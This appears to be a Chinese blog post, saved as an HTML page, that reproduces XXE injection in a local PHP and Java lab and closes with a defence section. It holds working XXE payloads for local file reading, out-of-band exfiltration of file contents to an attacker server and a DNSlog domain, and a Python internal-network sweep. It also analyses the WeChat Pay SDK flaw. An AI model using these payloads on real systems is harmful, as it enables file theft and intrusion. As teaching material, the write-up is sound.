@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  
+  <title>xxe - Sla，当你走了，我发誓不会堕落</title>
+  <meta charset="UTF-8">
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="/images/avatar.png" type="image/png" />
+  <meta name="description" content="之前只是了解过XXE，但是没有深入理解，这次自己动手复现学习下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe">
+<meta property="og:url" content="https:&#x2F;&#x2F;ctfer-stao.github.io&#x2F;posts&#x2F;7f9d86d3.html">
+<meta property="og:site_name" content="Sla，当你走了，我发誓不会堕落">
+<meta property="og:description" content="之前只是了解过XXE，但是没有深入理解，这次自己动手复现学习下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;1.gif">
+<meta property="og:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;9.png">
+<meta property="article:published_time" content="2020-01-02T14:44:03.327Z">
+<meta property="article:modified_time" content="2020-01-04T06:28:03.490Z">
+<meta property="article:author" content="Stao">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="xxe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;blog-1301050970.cos.ap-guangzhou.myqcloud.com&#x2F;xee&#x2F;1.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1578122597992">
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(https://i.loli.net/2019/01/13/5c3aec85a4343.jpg)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="Stao" class="mdui-btn mdui-btn-icon"><img src="/images/avatar.png"></a>
+       </div>
+    </div>
+  </div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="Stao">
+            <img src="/images/avatar.png" alt="Stao">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>4</div>
+        <div><span>标签</span>8</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/ctfer-Stao" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/web/">web</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">标签云</h3>
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
+      <a href="/tags/base64/" style="font-size: 10px;">base64</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/readflag/" style="font-size: 10px;">readflag</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/web/" style="font-size: 20px;">web</a> <a href="/tags/xxe/" style="font-size: 15px;">xxe</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a>
+    </div>
+    
+  </div>
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2020 Stao
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+        <img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png">
+        
+        <h1>xxe</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2020年01月02日</a>
+    <a><i class="nexmoefont icon-areachart"></i>3.4k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 17 分钟</a>
+    
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/web/">web</a>
+    
+    
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/web/" rel="tag">web</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/xxe/" rel="tag">xxe</a>
+    
+  </div>
+  <article>
+    <p>之前只是了解过XXE，但是没有深入理解，这次自己动手复现学习下。</p>
+<a id="more"></a>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，是对XML注入的扩展，普通的 XML 注入太过鸡肋。</p>
+<h2 id="XML的基础知识"><a href="#XML的基础知识" class="headerlink" title="XML的基础知识"></a>XML的基础知识</h2><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p>
+<p>示例代码：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义
+&lt;!DOCTYPE message [
+&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;
+&lt;!ELEMENT receiver (#PCDATA)&gt;
+&lt;!ELEMENT sender (#PCDATA)&gt;
+&lt;!ELEMENT header (#PCDATA)&gt;
+&lt;!ELEMENT msg (#PCDATA)&gt;</code></pre><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p>
+<p>示例代码：</p>
+<pre><code>&lt;message&gt;
+&lt;receiver&gt;Myself&lt;/receiver&gt;
+&lt;sender&gt;Someone&lt;/sender&gt;
+&lt;header&gt;TheReminder&lt;/header&gt;
+&lt;msg&gt;This is an amazing book&lt;/msg&gt;
+&lt;/message&gt;</code></pre><p>DTD中还可以定义实体</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体，到时候我们可以在 XML 中通过 &amp; 符号进行引用，那么 XML 就可以写成这样</p>
+<pre><code>&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
+<p>上面的例子是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</p>
+<p>示例代码：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;
+&lt;creds&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;</code></pre><p>上面的例子是通用实体，在XML文档引用，而参数实体，% 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用</p>
+<h2 id="XXE利用一：有回显的读取敏感文件"><a href="#XXE利用一：有回显的读取敏感文件" class="headerlink" title="XXE利用一：有回显的读取敏感文件"></a>XXE利用一：有回显的读取敏感文件</h2><p>首先在本地上搭建php环境</p>
+<pre><code>&lt;?php
+
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents(&apos;php://input&apos;);
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+$c = simplexml_import_dom($dom);
+echo $c;
+
+?&gt;</code></pre><p>payload:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE test [  
+&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
+&lt;test&gt;&amp;goodies;&lt;/test&gt;</code></pre><p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/1.png" alt=""><br>成功读取到文件</p>
+<p>当文件含有特殊字符，如&amp;,&lt;,&gt;,”,’等，文件读取会失败。这时候我们可以利用base64编码输出</p>
+<p>payload:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE test [  
+&lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;&gt; ]&gt; 
+&lt;test&gt;&amp;goodies;&lt;/test&gt;</code></pre><p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/2.png" alt=""></p>
+<p>另外一种方法是把我们的读出来的数据放在 CDATA 中输出。</p>
+<pre><code>&lt;![CDATA[
+
+XXXXXXXXXXXXXXXXX
+
+]]&gt;</code></pre><p>这时候需要用到参数实体和外部引用DTD文件。要确保服务器支持外部引用，如果是PHP环境，需要allow_url_fopen=on。</p>
+<pre><code>payload:
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
+&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
+&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; 
+%dtd; ]&gt; 
+
+&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p>同时在自己的服务器下放置did文件</p>
+<p>evil.dtd</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
+&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/3.png" alt=""></p>
+<h2 id="XXE利用二：没有回显读取敏感文件"><a href="#XXE利用二：没有回显读取敏感文件" class="headerlink" title="XXE利用二：没有回显读取敏感文件"></a>XXE利用二：没有回显读取敏感文件</h2><p>首先将我们刚刚搭建的PHP环境改为无回显的。</p>
+<pre><code>&lt;?php
+
+libxml_disable_entity_loader (false);
+$xmlfile = file_get_contents(&apos;php://input&apos;);
+$dom = new DOMDocument();
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+?&gt;</code></pre><p>因为没有回显，所以我们要将文件外带出来，所以需要发起请求，而且要将读取的文件内容放入请求中，所以要用到外部DTD。<br>首先在自己的服务器下放置DTD文件</p>
+<p>test.dtd</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</code></pre><p>ps: send 前面的 %要转为HTML 实体，否则会出错。因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;</p>
+<p>payload:</p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;</code></pre><p>整个调用过程：</p>
+<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<p>可以在apache的access.log中看到请求记录中带有编码后的文件内容</p>
+<p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/4.png" alt=""></p>
+<p>也可以在kali 用nc -lvp 端口号 进行监听</p>
+<p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/6.png" alt=""></p>
+<p>如果将DTD文件内容改为：</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/1.txt&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://www.eyngtd.ceye.io/%file;&apos;&gt;&quot;</code></pre><p>则可以在DNSlog在看到外带出来的内容(dnslog的知识在我之前的博客有提到)</p>
+<p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/5.png" alt=""></p>
+<h2 id="XXE利用三-HTTP-内网主机探测"><a href="#XXE利用三-HTTP-内网主机探测" class="headerlink" title="XXE利用三: HTTP 内网主机探测"></a>XXE利用三: HTTP 内网主机探测</h2><p>可以利用XXE来探测内网中的HTTP主机</p>
+<p>ptyhon脚本：</p>
+<pre><code>import requests
+import base64
+def build_xml(string):
+    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &apos;&quot;&apos; + string + &apos;&quot;&apos; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;
+    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;
+    send_xml(xml)
+
+def send_xml(xml):
+    headers = {&apos;Content-Type&apos;: &apos;application/xml&apos;}
+    x = requests.post(&apos;http://10.10.10.1:8080/123.php&apos;, data=xml, headers=headers, timeout=5).text
+    coded_string = x.split(&apos; &apos;)[-2] # a little split to get only the base64 encoded value
+    print (coded_string)
+
+for i in range(1, 255):
+    try:
+            i = str(i)
+            ip = &apos;10.10.10.&apos; + i
+            string = &apos;php://filter/convert.base64-encode/resource=http://&apos; + ip + &apos;/&apos;
+            print (string)
+            build_xml(string)
+    except:
+            continue</code></pre><p>即探测内网中开放80端口的主机，需要有回显的情况</p>
+<h2 id="XXE利用四：探测内网端口"><a href="#XXE利用四：探测内网端口" class="headerlink" title="XXE利用四：探测内网端口"></a>XXE利用四：探测内网端口</h2><p>可以结合bp的爆破模块，根据响应时间大概探测端口。</p>
+<h2 id="XXE利用五：远程代码执行"><a href="#XXE利用五：远程代码执行" class="headerlink" title="XXE利用五：远程代码执行"></a>XXE利用五：远程代码执行</h2><p>需要php开启expect模块，这种情况很少。</p>
+<pre><code>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</code></pre><h2 id="XXE利用五：上传文件"><a href="#XXE利用五：上传文件" class="headerlink" title="XXE利用五：上传文件"></a>XXE利用五：上传文件</h2><p>前面将的都是跟PHP有关的xxe漏洞，有师傅说实际上现实中很多都是 java 的框架出现的 XXE 漏洞。首先认识下java的协议 jar://。</p>
+<p>jar:// 协议的格式：</p>
+<pre><code>jar:{url}!{path}</code></pre><p>实例：</p>
+<pre><code>jar:http://host/application.jar!/file/within/the/zip</code></pre><p>这个 ! 后面就是其需要从中解压出的文件</p>
+<p>jar 协议处理文件的过程：</p>
+<p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p>
+<p>网上找的解析 XML 文件的 java 源码：</p>
+<pre><code>package xml_test;
+import java.io.File;
+
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+
+import org.w3c.dom.Attr;
+import org.w3c.dom.Comment;
+import org.w3c.dom.Document;
+import org.w3c.dom.Element;
+import org.w3c.dom.NamedNodeMap;
+import org.w3c.dom.Node;
+import org.w3c.dom.NodeList;
+
+public class xml_test
+{
+public static void main(String[] args) throws Exception
+{
+    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+    DocumentBuilder db = dbf.newDocumentBuilder();
+
+    Document doc = db.parse(new File(&quot;student.xml&quot;));
+    //获得根元素结点
+    Element root = doc.getDocumentElement();
+
+    parseElement(root);
+}
+
+private static void parseElement(Element element)
+{
+    String tagName = element.getNodeName();
+
+    NodeList children = element.getChildNodes();
+
+    System.out.print(&quot;&lt;&quot; + tagName);
+
+    //element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断
+    NamedNodeMap map = element.getAttributes();
+
+    //如果该元素存在属性
+    if(null != map)
+    {
+        for(int i = 0; i &lt; map.getLength(); i++)
+        {
+            //获得该元素的每一个属性
+            Attr attr = (Attr)map.item(i);
+
+            String attrName = attr.getName();
+            String attrValue = attr.getValue();
+
+            System.out.print(&quot; &quot; + attrName + &quot;=\&quot;&quot; + attrValue + &quot;\&quot;&quot;);
+        }
+    }
+
+    System.out.print(&quot;&gt;&quot;);
+
+    for(int i = 0; i &lt; children.getLength(); i++)
+    {
+        Node node = children.item(i);
+        //获得结点的类型
+        short nodeType = node.getNodeType();
+
+        if(nodeType == Node.ELEMENT_NODE)
+        {
+            //是元素，继续递归
+            parseElement((Element)node);
+        }
+        else if(nodeType == Node.TEXT_NODE)
+        {
+            //递归出口
+            System.out.print(node.getNodeValue());
+        }
+        else if(nodeType == Node.COMMENT_NODE)
+        {
+            System.out.print(&quot;&lt;!--&quot;);
+
+            Comment comment = (Comment)node;
+
+            //注释内容
+            String data = comment.getData();
+
+            System.out.print(data);
+
+            System.out.print(&quot;--&gt;&quot;);
+        }
+    }
+
+    System.out.print(&quot;&lt;/&quot; + tagName + &quot;&gt;&quot;);
+}
+}</code></pre><p>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY  remote SYSTEM &quot;jar:http://localhost:9999/jar.zip!/wm.php&quot;&gt;
+]&gt;
+&lt;convert&gt;&amp;remote;&lt;/convert&gt;</code></pre><p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/7.png" alt=""></p>
+<p>大佬用 python 写的一个 TCP 服务器，这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，这里加了一个 sleep(30)，来延长临时文件的存在时间。</p>
+<p>python脚本：</p>
+<pre><code>import sys 
+import time 
+import threading 
+import socketserver 
+from urllib.parse import quote 
+import http.client as httpc 
+
+listen_host = &apos;localhost&apos; 
+listen_port = 9999 
+jar_file = sys.argv[1]
+
+class JarRequestHandler(socketserver.BaseRequestHandler):  
+    def handle(self):
+            http_req = b&apos;&apos;
+            print(&apos;New connection:&apos;,self.client_address)
+            while b&apos;\r\n\r\n&apos; not in http_req:
+                try:
+                        http_req += self.request.recv(4096)
+                        print(&apos;Client req:\r\n&apos;,http_req.decode())
+                        jf = open(jar_file, &apos;rb&apos;)
+                        contents = jf.read()
+                        headers = (&apos;&apos;&apos;HTTP/1.0 200 OK\r\n&apos;&apos;&apos;
+                        &apos;&apos;&apos;Content-Type: application/java-archive\r\n\r\n&apos;&apos;&apos;)
+                        self.request.sendall(headers.encode(&apos;ascii&apos;))
+
+                        self.request.sendall(contents[:-1])
+                        time.sleep(30)
+                        print(30)
+                        self.request.sendall(contents[-1:])
+
+                except Exception as e:
+                        print (&quot;get error at:&quot;+str(e))
+
+
+if __name__ == &apos;__main__&apos;:
+
+    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
+    print (&apos;waiting for connection...&apos;) 
+    server_thread = threading.Thread(target=jarserver.serve_forever) 
+    server_thread.daemon = True 
+    server_thread.start() 
+    server_thread.join()</code></pre><p>如果我们要知道临时文件所在的文件夹，可以利用报错来知晓。</p>
+<pre><code>jar:http://localhost:9999/jar.zip!/1.php</code></pre><p>当1.php不在jar.zip中时，会报错。</p>
+<p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/8.png" alt=""></p>
+<p>知道路径后，我们就要利用sleep()延长临时文件的存在时间，而且，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符。</p>
+<p>演示的动图，可以看到，临时文件在文件夹存在了一小段时间。</p>
+<p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/1.gif" alt=""></p>
+<p>具体怎么利用，看实际情况吧。</p>
+<h2 id="微信支付的XXE"><a href="#微信支付的XXE" class="headerlink" title="微信支付的XXE"></a>微信支付的XXE</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品</p>
+<p>我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中</p>
+<pre><code>public static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception {
+        try {
+            Map&lt;String, String&gt; data = new HashMap();
+            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();
+            InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;));
+            Document doc = documentBuilder.parse(stream);
+            doc.getDocumentElement().normalize();
+            NodeList nodeList = doc.getDocumentElement().getChildNodes();
+
+            for(int idx = 0; idx &lt; nodeList.getLength(); ++idx) {
+                Node node = nodeList.item(idx);
+                if (node.getNodeType() == 1) {
+                    Element element = (Element)node;
+                    data.put(element.getNodeName(), element.getTextContent());
+                }
+            }
+
+            try {
+                stream.close();
+            } catch (Exception var9) {
+                ;
+            }
+
+            return data;
+        } catch (Exception var10) {
+            getLogger().warn(&quot;Invalid XML, can not convert to map. Error message: {}. XML content: {}&quot;, var10.getMessage(), strXML);
+            throw var10;
+        }
+    }</code></pre><p>我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML 解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞.<br>为了测试漏洞，在 com 包下又新建了一个包，来写我们的测试代码，测试代码命名为 test001.java</p>
+<p>test001.java</p>
+<pre><code>package com.test.test001;
+
+import java.util.Map;
+
+import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;
+
+public class test001 {
+    public static void main(String args[]) throws Exception {
+
+        String xmlStr =&quot;&lt;?xml version=&apos;1.0&apos; encoding=&apos;utf-8&apos;?&gt;\r\n&quot; +
+                &quot;&lt;!DOCTYPE XDSEC [\r\n&quot; +
+                &quot;&lt;!ENTITY xxe SYSTEM &apos;netdoc:/d:/1.txt&apos;&gt;]&gt;\r\n&quot; +
+                &quot;&lt;XDSEC&gt;\r\n&quot;+
+                &quot;&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\r\n&quot; +
+                &quot;&lt;/XDSEC&gt;&quot;;
+
+        try{
+
+            Map&lt;String,String&gt; test = xmlToMap(xmlStr);
+        System.out.println(test);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+
+    }
+}</code></pre><p>这里用了netdoc:/协议，netdoc:/ 和file:///一样，可以读取文件，在java中。</p>
+<p><img src="https://blog-1301050970.cos.ap-guangzhou.myqcloud.com/xee/9.png" alt=""></p>
+<h2 id="JSON-content-type-XXE"><a href="#JSON-content-type-XXE" class="headerlink" title="JSON content-type XXE"></a>JSON content-type XXE</h2><p>正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击。也就是原本接受数据格式为JSON，Content-Type: application/json的服务器，在传入xml数据，Content-Type: application/xml后可能可以解析xml数据。从而造成漏洞。</p>
+<h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><p>使用语言中推荐的禁用外部实体的方法</p>
+<p>PHP：</p>
+<pre><code>libxml_disable_entity_loader(true);</code></pre><p>JAVA:</p>
+<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+dbf.setExpandEntityReferences(false);
+
+.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);
+
+.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)
+
+.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</code></pre><p>Python：</p>
+<pre><code>from lxml import etree
+xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/3357#toc-20" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-20</a></p>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>Stao<br>
